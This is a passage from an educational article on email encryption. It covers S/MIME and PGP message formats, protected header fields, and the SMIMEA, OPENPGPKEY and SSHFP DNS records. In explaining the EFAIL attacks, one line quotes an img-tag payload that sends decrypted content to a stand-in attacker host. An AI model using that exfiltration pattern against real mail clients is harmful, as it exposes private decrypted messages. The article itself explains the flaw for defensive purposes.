The output is itself a <abbr title="Multipurpose Internet Mail Extensions">MIME</abbr> part with a <a href="#content-type">content type</a> of
<a href="https://datatracker.ietf.org/doc/html/rfc8551#section-3.2"><code>application/pkcs7-mime</code></a>,
<a href="https://datatracker.ietf.org/doc/html/rfc1847#section-2.1"><code>multipart/signed</code></a>, or
<a href="https://datatracker.ietf.org/doc/html/rfc1847#section-2.2"><code>multipart/encrypted</code></a>.
Given that the output is just another <abbr title="Multipurpose Internet Mail Extensions">MIME</abbr> part, the operations can be applied
<a href="https://datatracker.ietf.org/doc/html/rfc8551#section-3.7">in any order</a>.
Therefore, a message can be first encrypted and then signed,
but <a href="#modes-of-operation">as we discussed</a>, this is not recommended.
The flexibility of multipart nesting leads to a lot of complexity.
Since complexity is detrimental to security,
this is not ideal for end-to-end security.
Security researchers <a href="https://efail.de/">published several attacks on <abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr> and <abbr title="Pretty Good Privacy">PGP</abbr></a> in 2018.
Among other things, they showed that several mail clients, including Apple Mail and Thunderbird,
allowed <a href="#html-emails"><abbr title="HyperText Markup Language">HTML</abbr> content</a> to span several <abbr title="Multipurpose Internet Mail Extensions">MIME</abbr> parts.
An attacker could simply wrap an encrypted part with <code>&lt;img src=&#34;https://attacker.example/{EncryptedPart}&#34;&gt;</code>
in order to trick mail clients into sending the decryption to them.
A vulnerability like this is yet another reason to disable <a href="#remote-content">remote content</a> in your mail client.
Let’s look at some example messages:</p>

  <figure>

    <div><div><pre><code>MIME-Version: 1.0
Content-Type: application/pkcs7-mime; smime-type=signed-data; name=smime.p7m
Content-Disposition: attachment; filename=smime.p7m
Content-Transfer-Encoding: base64

[Base64-encoded content and signature]
</code></pre></div>    </div>

    <figcaption>

<strong><abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr> signature</strong> using the <code>application/pkcs7-mime</code> format.
<a href="https://datatracker.ietf.org/doc/html/rfc8551#section-3.5.2">↗</a>

</figcaption>
  </figure>

  <figure>

    <div><div><pre><code>MIME-Version: 1.0
Content-Type: multipart/signed; micalg=sha-256;
    protocol=&#34;application/pkcs7-signature&#34;;
    boundary=&#34;UniqueBoundary&#34;

--UniqueBoundary
Content-Type: text/plain; charset=us-ascii

This part is signed.

--UniqueBoundary
Content-Type: application/pkcs7-signature; name=smime.p7s
Content-Disposition: attachment; filename=smime.p7s
Content-Transfer-Encoding: base64

[Base64-encoded signature with metadata]

--UniqueBoundary--
</code></pre></div>    </div>

    <figcaption>

<strong><abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr> signature</strong> using the <code>multipart/signed</code> format.
<a href="https://datatracker.ietf.org/doc/html/rfc8551#section-3.5.3.3">↗</a>
<code>micalg</code> stands for <a href="https://datatracker.ietf.org/doc/html/rfc1847#section-2.1">message integrity check (<abbr title="Message Integrity Check">MIC</abbr>) algorithm</a>.
The advantage of this format is that users can read the message even if their mail client doesn’t support <abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr>.

</figcaption>
  </figure>

  <figure>

    <div><div><pre><code>MIME-Version: 1.0
Content-Type: application/pkcs7-mime; smime-type=authEnveloped-data; name=smime.p7m
Content-Disposition: attachment; filename=smime.p7m
Content-Transfer-Encoding: base64

[Base64-encoded ciphertext with metadata]
</code></pre></div>    </div>

    <figcaption>

<strong><abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr> encryption</strong> with <a href="#deniable-authentication">integrity protection</a>.
<a href="https://datatracker.ietf.org/doc/html/rfc8551#section-3.4">↗</a>

</figcaption>
  </figure>

  <figure>

    <div><div><pre><code>MIME-Version: 1.0
Content-Type: multipart/signed; micalg=sha-256;
    protocol=&#34;application/pgp-signature&#34;;
    boundary=&#34;UniqueBoundary&#34;

--UniqueBoundary
Content-Type: text/plain; charset=us-ascii

This part is signed.

--UniqueBoundary
Content-Type: application/pgp-signature; name=signature.asc
Content-Disposition: attachment; filename=signature.asc

-----BEGIN PGP MESSAGE-----

[Base64-encoded signature with metadata]
=[Base64-encoded checksum of the signature]
-----END PGP MESSAGE-----

--UniqueBoundary--
</code></pre></div>    </div>

    <figcaption>

<strong><abbr title="Pretty Good Privacy">PGP</abbr> signature</strong> with the message in the first part.
<a href="https://datatracker.ietf.org/doc/html/rfc3156#section-5">↗</a>
The <a href="https://datatracker.ietf.org/doc/html/rfc4880#section-6">checksum</a> is a 24-bit
<a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check">cyclic redundancy check (<abbr title="Cyclic Redundancy Check">CRC</abbr>)</a>.
Some implementations use <code>BEGIN PGP SIGNATURE</code>
<a href="https://datatracker.ietf.org/doc/html/rfc4880#section-6.2">instead of</a> <code>BEGIN PGP MESSAGE</code>.

</figcaption>
  </figure>

  <figure>

    <div><div><pre><code>MIME-Version: 1.0
Content-Type: multipart/encrypted;
    protocol=&#34;application/pgp-encrypted&#34;;
    boundary=&#34;UniqueBoundary&#34;

--UniqueBoundary
Content-Type: application/pgp-encrypted

Version: 1

--UniqueBoundary
Content-Type: application/octet-stream; name=encrypted.asc
Content-Disposition: attachment; filename=encrypted.asc

-----BEGIN PGP MESSAGE-----

[Base64-encoded ciphertext with metadata]
=[Base64-encoded checksum of the ciphertext]
-----END PGP MESSAGE-----

--UniqueBoundary--
</code></pre></div>    </div>

    <figcaption>

<strong><abbr title="Pretty Good Privacy">PGP</abbr> encryption</strong> with metadata in the first part.
<a href="https://datatracker.ietf.org/doc/html/rfc3156#section-4">↗</a>
If the plaintext has been signed,
you get the format of the previous example without <code>MIME-Version: 1.0</code> after decryption.

</figcaption>
  </figure>

</details>

<details>
  

  <p>An email consists of <a href="#header-fields-and-body">header fields and a body</a>.
By transforming <a href="#multipart-messages"><abbr title="Multipurpose Internet Mail Extensions">MIME</abbr> parts</a>,
<abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr> and <abbr title="Pretty Good Privacy">PGP</abbr> can protect only the body of a message but not its header fields.
If you sign and/or encrypt a message, you want to sign and/or encrypt the <a href="#subject">subject</a> as well.
The <a href="#recipients">recipients</a> should also be covered by the signature.
Otherwise, one of the recipients can
<a href="https://theworld.com/~dtd/sign_encrypt/sign_encrypt7.html#tth_sEc1.1">forward the signed body to someone else</a>.
For example, when Alice sends “I have to cancel our meeting” to Bob,
Bob shouldn’t be able to forward the signed body to Carol.
There are three ways to secure header fields.
Before you rely on end-to-end security, make sure that your mail client uses one of them.</p>
  <ul>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc8551#section-3.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8551</a> suggests
that mail clients can wrap the full message with a <a href="#content-type">content type</a> of <code>message/rfc822</code>.
The receiving mail client has to decide what to do
when the protected header fields diverge from the unprotected header fields.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc7508"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7508</a> specifies how a sending mail client can include header fields
in the <a href="https://datatracker.ietf.org/doc/html/rfc5652#section-5.3">signed attributes</a> of its <abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr> signature.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/draft-autocrypt-lamps-protected-headers-02.html">This draft</a> specifies how
header fields can be repeated in the signed <abbr title="Multipurpose Internet Mail Extensions">MIME</abbr> part with a content-type parameter of <code>protected-headers=&#34;v1&#34;</code>.
If the message is encrypted, the original subject should be replaced
<a href="https://datatracker.ietf.org/doc/html/draft-autocrypt-lamps-protected-headers-02.html#section-4.2">with three periods</a>.</li>
  </ul>

  <p>Thunderbird follows the last specification.
A message with protected header fields looks as follows after decrypting its body:</p>

  <figure>

    <div><div><pre><code>From: Alice &lt;alice@example.org&gt;
To: Bob &lt;bob@example.com&gt;
Subject: ...
Date: Wed, 21 Apr 2021 10:55:18 +0200
Message-ID: &lt;unique-identifier@example.org&gt;
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=sha-256;
    protocol=&#34;application/pgp-signature&#34;;
    boundary=&#34;UniqueBoundary&#34;

--UniqueBoundary
Content-Type: text/plain; charset=us-ascii; protected-headers=&#34;v1&#34;
From: Alice &lt;alice@example.org&gt;
To: Bob &lt;bob@example.com&gt;
Subject: Our secret plan
Date: Wed, 21 Apr 2021 10:55:18 +0200
Message-ID: &lt;unique-identifier@example.org&gt;

This part is signed (including the header fields).

--UniqueBoundary
Content-Type: application/pgp-signature

-----BEGIN PGP SIGNATURE-----

[Base64-encoded signature with metadata]
=[Base64-encoded checksum of the signature]
-----END PGP SIGNATURE-----

--UniqueBoundary--
</code></pre></div>    </div>

    <figcaption>

<strong><abbr title="Pretty Good Privacy">PGP</abbr> signature</strong> with protected header fields.
<a href="https://datatracker.ietf.org/doc/html/draft-autocrypt-lamps-protected-headers-02.html#section-9.1">↗</a>
The original subject is replaced with three dots only when the message is encrypted.

</figcaption>
  </figure>

</details>

<details>
  <summary id="smimea-resource-record">
SMIMEA resource record
</summary>

  <p>A challenge when using end-to-end security is to get the public key of the recipient
and to verify the public key of the sender.
<a href="https://datatracker.ietf.org/doc/html/rfc8162"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8162</a> specifies an experimental standard
to anchor <abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr> certificates in the <abbr title="Domain Name System">DNS</abbr> just like <a href="#dns-based-authentication-of-named-entities"><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr></a>.
For this purpose, it defines the <a href="https://datatracker.ietf.org/doc/html/rfc8162#section-2"><code>SMIMEA</code> record type</a>,
which has the same format and semantics as the <a href="#tlsa-record-type"><code>TLSA</code> record type</a>.
All four <a href="#tlsa-record-type">certificate usages</a> <a href="https://datatracker.ietf.org/doc/html/rfc8162#section-5">can be used</a>,
and unlike <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>, publishing the full certificate in the <code>SMIMEA</code> record is not discouraged.
As a sender, you need the unhashed public key of the recipient in order to encrypt the message for them.
As a recipient, it’s enough if you can verify the public key of the sender with its hash in the <code>SMIMEA</code> record.</p>

  <p>The <a href="https://datatracker.ietf.org/doc/html/rfc8162#section-3">location of the <code>SMIMEA</code> record</a> is determined
by hashing the <a href="#character-encoding"><abbr title="Unicode Transformation Format">UTF</abbr>-8-encoded</a> <a href="#address-syntax">local part</a> of the email address
after removing any <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.2.2">comments and folding whitespace</a>
and <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.2.4">enclosing double quotes</a>.
The local part should be <a href="#unicode-normalization"><abbr title="Normalization Form (Canonical) Composition (for Unicode strings)">NFC</abbr> normalized</a>
before hashing it with <a href="#secure-hash-algorithms"><abbr title="Secure Hash Algorithm">SHA</abbr>-256</a>.
The <a href="https://evalapply.org/internet/#number-encoding">hexadecimal encoding</a> of the first 28 of the 32 bytes of the hash
is used to form the domain name as follows: <code>{Hash}._smimecert.{Domain}</code>.
The local part is hashed in order to support <a href="#email-address-internationalization">internationalized email addresses</a>.
A problem of hashing is that provider-specific <a href="#normalization">normalizations of the local part</a>,
such as lowercasing all characters and removing all periods,
<a href="https://datatracker.ietf.org/doc/html/rfc8162#section-4">cannot be considered</a>.
Users should use the email address as written in the <abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr> certificate or <abbr title="Pretty Good Privacy">PGP</abbr> identity
or publish a <code>SMIMEA</code> record for all common variants of their local part.
Instead of publishing a separate record for each user,
an organization can publish a <a href="https://en.wikipedia.org/wiki/Wildcard_DNS_record">wildcard record</a>
with a trust anchor which issues certificates for all its members.
This approach doesn’t allow senders to look up the public keys of members of this organization, though.
In order to reduce the load on <abbr title="Domain Name System">DNS</abbr> caches, such a wildcard record should be a small <code>CNAME</code> record
which points to the much larger <code>SMIMEA</code> record at a single domain name.</p>

  <p>When it comes to privacy, publishing information about individual users in the <abbr title="Domain Name System">DNS</abbr> is not ideal.
Unless a client uses <a href="https://en.wikipedia.org/wiki/DNS_over_TLS"><abbr title="Domain Name System">DNS</abbr> over <abbr title="Transport Layer Security">TLS</abbr></a>,
queries for <code>SMIMEA</code> records can be monitored by anyone in the user’s network.
Additionally, <code>SMIMEA</code> records <a href="https://datatracker.ietf.org/doc/html/rfc8162#section-6">have to be authenticated</a>
with <a href="https://evalapply.org/internet/#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a>.
If a domain uses <code>NSEC</code> instead of <code>NSEC3</code> records for authenticated denial of existence,
anyone can <a href="https://evalapply.org/internet/#domain-name-system-security-extensions">walk the zone</a>
to determine the hash of all local parts with a <code>SMIMEA</code> record.
Since the local part is hashed without the domain part of the email address,
short and common local parts <a href="https://datatracker.ietf.org/doc/html/rfc8162#section-9.2">can be found</a>
with a single <a href="#salts-against-pooled-brute-force-attacks">rainbow table</a> across domains.</p>

  <p>The following tool queries the <code>SMIMEA</code> record of an email address with
<a href="https://developers.google.com/speed/public-dns/docs/doh/json">Google’s <abbr title="Domain Name System">DNS</abbr> <abbr title="Application Programming Interface">API</abbr></a>.
Besides <a href="#unicode-normalization">Unicode normalization</a>, the local part is hashed as is.
You can test the tool with the email address <code>ietf-dane-phil@spodhuis.org</code>,
which I found <a href="https://mailarchive.ietf.org/arch/msg/dane/BOfOUBjSp27jByN6LJXjwrJ6sJM/">here</a>.</p>

  

</details>

<details>
  <summary id="openpgpkey-resource-record">
OPENPGPKEY resource record
</summary>

  <p><a href="https://datatracker.ietf.org/doc/html/rfc7929"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7929</a> specifies how users can publish their <abbr title="The open standard for Pretty Good Privacy">OpenPGP</abbr> keys in the <abbr title="Domain Name System">DNS</abbr>
with the new <a href="https://datatracker.ietf.org/doc/html/rfc7929#section-2"><code>OPENPGPKEY</code> record type</a>.
<code>OPENPGPKEY</code> resource records are <a href="https://datatracker.ietf.org/doc/html/rfc7929#section-2.2">transmitted in binary</a>
but <a href="https://datatracker.ietf.org/doc/html/rfc7929#section-2.3">presented in Base64</a>.
Even though <code>OPENPGPKEY</code> records <a href="https://datatracker.ietf.org/doc/html/rfc7929#section-5">must be authenticated</a>
with <a href="https://evalapply.org/internet/#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a>,
retrieved keys should still be verified by the user out-of-band.
The <a href="https://datatracker.ietf.org/doc/html/rfc7929#section-3">location of <code>OPENPGPKEY</code> records</a> is determined
in the same way as it is done for <a href="#smimea-resource-record"><code>SMIMEA</code> records</a>
with the exception that the subdomain is <code>_openpgpkey</code> instead of <code>_smimecert</code>.
Indirections with <code>CNAME</code> records are allowed as long as the original email address
is listed as one of the user identities in the found <abbr title="The open standard for Pretty Good Privacy">OpenPGP</abbr> key.
A user identity can have the <a href="https://en.wikipedia.org/wiki/Wildcard_character">wildcard character</a> <code>*</code> as its local part
so that a single key can be used
<a href="https://datatracker.ietf.org/doc/html/rfc7929#section-5.3">for all addresses of the given domain</a>.
Besides <a href="https://datatracker.ietf.org/doc/html/rfc7929#section-5.1">obtaining the key for an email address</a>, <code>OPENPGPKEY</code>
records allow others to detect <a href="https://datatracker.ietf.org/doc/html/rfc7929#section-5.2">when a key has been revoked</a>.</p>

  <p>The following tool queries the <code>OPENPGPKEY</code> record of an email address with
<a href="https://developers.google.com/speed/public-dns/docs/doh/json">Google’s <abbr title="Domain Name System">DNS</abbr> <abbr title="Application Programming Interface">API</abbr></a>.
You can test the tool with the email address <code>security@ef1p.com</code>.
The <a href="https://en.wikipedia.org/wiki/Public_key_fingerprint">key’s fingerprint</a>
is <code>7044 3D35 13F7 9AD9 2527  667F 6B14 3BF1 470C 9367</code>.
You can use this key if you want to report security-related issues to me.
The tool displays the key in <a href="https://datatracker.ietf.org/doc/html/rfc4880#section-6.2"><abbr title="American Standard Code for Information Interchange">ASCII</abbr> armor</a>.
The first two lines and the last two lines are not part of the <code>OPENPGPKEY</code> record.
(The second last line is a <a href="https://datatracker.ietf.org/doc/html/rfc4880#section-6">24-bit checksum</a>.)</p>

  

  <p>If you want to publish an <code>OPENPGPKEY</code> record,
you can export your key with one of the following two commands
depending on whether your <a href="https://en.wikipedia.org/wiki/Domain_name_registrar">domain name registrar</a>
supports the <code>OPENPGPKEY</code> presentation format
(consult <a href="https://www.gnupg.org/documentation/manuals/gnupg/GPG-Input-and-Output.html"><code>--export-options</code></a> for details):</p>

  

  <p>You can configure <abbr title="GNU Privacy Guard">GnuPG</abbr> to look for <code>OPENPGPKEY</code> records automatically with the
<a href="https://www.gnupg.org/documentation/manuals/gnupg/GPG-Configuration-Options.html"><code>--auto-key-locate</code> configuration option</a>.</p>

</details>

<details>
  <summary id="sshfp-resource-record">
SSHFP resource record
</summary>

  <p>After having seen how public keys can be published in the <abbr title="Domain Name System">DNS</abbr> for <a href="#tlsa-record-type"><abbr title="Transport Layer Security">TLS</abbr></a>,
<a href="#smimea-resource-record"><abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr></a>, and <a href="#openpgpkey-resource-record"><abbr title="The open standard for Pretty Good Privacy">OpenPGP</abbr></a>,
I just want to mention that this is also supported for the
<a href="https://en.wikipedia.org/wiki/Secure_Shell_Protocol">Secure Shell Protocol (<abbr title="Secure Shell Protocol">SSH</abbr>)</a>,
which has nothing to do with email.
<a href="https://datatracker.ietf.org/doc/html/rfc4255"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 4255</a> specifies the
<a href="https://datatracker.ietf.org/doc/html/rfc4255#section-3"><code>SSHFP</code> record type</a>,
which consists of the following three fields:</p>
  <ul>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc4255#section-3.1.1"><strong>Algorithm number</strong></a>:
The algorithm of the <abbr title="Secure Shell Protocol">SSH</abbr> key.
<abbr title="Internet Assigned Numbers Authority">IANA</abbr> maintains the <a href="https://www.iana.org/assignments/dns-sshfp-rr-parameters/dns-sshfp-rr-parameters.xhtml#dns-sshfp-rr-parameters-1">registry of assigned values</a>.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc4255#section-3.1.2"><strong>Fingerprint type</strong></a>:
The <a href="#cryptographic-hash-functions">hash function</a> used to determine the key’s fingerprint.
<abbr title="Internet Assigned Numbers Authority">IANA</abbr> maintains the <a href="https://www.iana.org/assignments/dns-sshfp-rr-parameters/dns-sshfp-rr-parameters.xhtml#dns-sshfp-rr-parameters-2">registry of assigned values</a>.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc4255#section-3.1.3"><strong>Fingerprint</strong></a>:
The <a href="https://en.wikipedia.org/wiki/Public_key_fingerprint">fingerprint</a> of the <abbr title="Secure Shell Protocol">SSH</abbr> key.
The fingerprint is transmitted in binary and presented with <a href="https://evalapply.org/internet/#number-encoding">hexadecimal digits</a>.</li>
  </ul>

  <p>When a user connects to an <abbr title="Secure Shell Protocol">SSH</abbr> server for the first time,
they need to confirm the authenticity of the server’s public key.
Accepted public keys are added to the file <code>~/.ssh/known_hosts</code>
and used to authenticate future connections to the same server.
While the user should verify the server’s public key out-of-band,
the presented key is often accepted without any verification.
This model is known as <a href="https://en.wikipedia.org/wiki/Trust_on_first_use">trust on first use (<abbr title="Trust On First Use">TOFU</abbr>)</a>:
If the first connection was secure, all future connections will be secure.
If the first connection was intercepted by a <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man in the middle</a>,
then all future connections will be compromised as well.</p>

  <p><code>SSHFP</code> records leverage the authentication provided by <a href="https://evalapply.org/internet/#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a>
to secure the initial connection to an <abbr title="Secure Shell Protocol">SSH</abbr> server.
They are published at the domain of the server,
and you can look them up with the <a href="https://evalapply.org/internet/tools/#dns-resolver"><abbr title="Domain Name System">DNS</abbr> resolver</a> from the first article.
For example, the domain <code>ccczh.ch</code> has two <code>SSHFP</code> records,
and the server’s public key has to match <a href="https://datatracker.ietf.org/doc/html/rfc4255#section-2.1">at least one of them</a>.
<a href="https://en.wikipedia.org/wiki/OpenSSH">OpenSSH</a> allows you to generate the <code>SSHFP</code> records with the
<a href="https://man.openbsd.org/ssh-keygen.1#r">following command</a> on the server: <code>ssh-keygen -r {Hostname}</code>.
If your <a href="https://en.wikipedia.org/wiki/Name_server">name server</a> does not support
the <a href="https://datatracker.ietf.org/doc/html/rfc4255#section-3.2"><code>SSHFP</code> presentation format</a>,
you can use the <a href="https://man.openbsd.org/ssh-keygen.1#g"><code>-g</code> option</a>
to generate the <abbr title="Domain Name System">DNS</abbr> records in the <a href="https://datatracker.ietf.org/doc/html/rfc3597">generic format</a>.
In order to use <code>SSHFP</code> records to verify a server’s public key, you have to set the
<a href="https://man.openbsd.org/ssh_config.5#VerifyHostKeyDNS"><code>VerifyHostKeyDNS</code> configuration</a>
of your <abbr title="Secure Shell Protocol">SSH</abbr> client to <code>yes</code> or <code>ask</code>.
You can do this for a single connection with the <a href="https://man.openbsd.org/ssh.1#o"><code>-o</code> option</a>:
<code>ssh -o &#34;VerifyHostKeyDNS ask&#34;</code>.
You can also set this configuration for all hosts in the system-wide settings at <code>/etc/ssh/ssh_config</code>
or the user settings at <code>~/.ssh/config</code>:</p>

  <div><div><pre><code>Host *
    VerifyHostKeyDNS ask
</code></pre></div>  </div>

  <p>If no such folder or file exists in your user directory, you can create them with:</p>

  

</details>




            
            
        </article>
    </div></div>
  </body>
</html>
